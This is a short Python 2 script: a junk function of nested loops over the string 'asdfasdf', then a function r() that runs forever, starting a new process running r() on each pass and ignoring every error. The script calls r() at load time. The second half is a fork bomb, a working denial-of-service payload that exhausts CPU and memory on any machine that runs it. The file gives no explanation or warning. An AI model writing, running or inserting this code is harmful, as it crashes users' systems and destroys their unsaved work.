



def x():
	"asdfasdf"
	"asdfasdf"
	for i in "x":
		for j in "asdfasdf":
			i=j
			for k in "asdfasdf":
				j+=k
	"asdfasdf"
	"asdfasdf"


from multiprocessing import Queue, Process

def r():
	while True:
		try:
			print "*",
			x = Process(target=r)
			x.start()
			print "*",
		except:
			continue

r()


